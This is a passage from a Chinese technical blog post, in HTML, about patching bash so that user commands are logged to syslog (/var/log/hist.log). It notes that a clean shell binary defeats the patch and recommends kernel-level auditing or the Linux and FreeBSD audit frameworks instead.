style="color:#393A34">&amp;&amp;</span><span class="token macro property expression" style="color:#36acaa"> shell_input_line</span><span class="token macro property expression punctuation" style="color:#393A34">[</span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">]</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上面的调用产生了一条日志消息，此消息将被syslog根据LOG_CRIT级别送到local0的设备上。要让这个东东生效则还必须要在/etc/syslog.conf配置文件中加入一条：</p><p><code>local0.crit /var/log/hist.log</code></p><p>至此用户下达的每条指令都将躺在/var/log/hist.log里，这个日志文件一般情况下日有root用户有读权限。</p><p>要注意的是上面所提到的hack并不区分是否为不同用户的输入。要实现的话还有更多的事情需要做的。由于所有的命令都被记录下来，那么由shell脚本执行或启动bash时的配置文件执行所产生的垃圾信息也是会被记录下来的。</p><p>现在唯一剩下的问题是”上面的hack要怎样才能被攻破？”其实这相当滴简单：</p><p>—-&gt;编译或上传一个你自己的干净的bash或其他shell即可搞定。</p><p>由于上面的hack是在特定版本的基础上的所以你编译或上传的干净bash可能在他的系统上会运行失败。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="五总结">五：总结<a class="hash-link" href="#五总结" title="标题的直接链接">​</a></h2><p>Bash 只是一个shell，并不是一个logging设备，而bash_history只是用来为用户提供点方便少敲几下键盘而已。毫不装逼的说一句所有使用它来当监控设备的做法都是白搭。如果你是个较真的系统管理员且确实需要监控用户的活动，那就写个内核模块记录所有用户的键盘记录，并根据uid或其他参数进行过滤。这个方法将会非常管用并且很难被攻破（只是很难不是没那可能）。</p><p>现在已经有Linux包括FreeBSD下的审计框架可供选择。在FreeBSD平台，由Robert Watson和TrustedBSD项目开发的审计框架是选择之一。在linux平台，由来自红帽的Steve Grubb开发的Linux Auditing System也是一个选择：<a href="http://people.redhat.com/sgrubb/audit/" target="_blank" rel="noopener noreferrer">http://people.redhat.com/sgrubb/audit/</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="六参考资料">六：参考资料<a class="hash-link" href="#六参考资料" title="标题的直接链接">​</a></h2><ul><li><p>[1]<!-- --> bash &amp; syslog man pages</p></li><li><p>[2]<!-- --> bash-3.2 source code -<a href="http://ftp.gnu.org/gnu/bash/bash-3.2.tar.gz" target="_blank" rel="noopener noreferrer">http://ftp.gnu.org/gnu/bash/bash-3.2.tar.gz</a></p></li></ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/bash">bash</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/hitory-logging">hitory logging</a></li></ul></div></footer></article><nav class="pagination-nav" aria-label="博文列表分页导航"><a class="pagination-nav__link pagination-nav__link--prev" href="/notes/blog/page/3"><div class="pagination-nav__label">较新的博文</div></a></nav></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/notes/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/itxx00" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2022 老司机. Built with Docusaurus.</div></div></div></footer></div>
<script src="/notes/assets/js/runtime~main.ae88a0f6.js"></script>
<script src="/notes/assets/js/main.2eb4d627.js"></script>
</body>
</html>